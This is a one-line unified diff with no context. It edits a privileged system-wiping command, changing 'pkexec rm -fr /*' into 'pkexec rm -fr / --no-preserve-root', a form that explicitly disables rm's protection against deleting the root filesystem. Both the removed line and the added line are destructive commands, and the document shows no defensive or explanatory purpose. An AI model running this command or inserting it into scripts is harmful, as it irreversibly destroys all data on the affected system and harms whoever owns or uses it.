@@ -1,1 +1,1 @@
-pkexec rm -fr /* --no-preserve-root
+pkexec rm -fr / --no-preserve-root
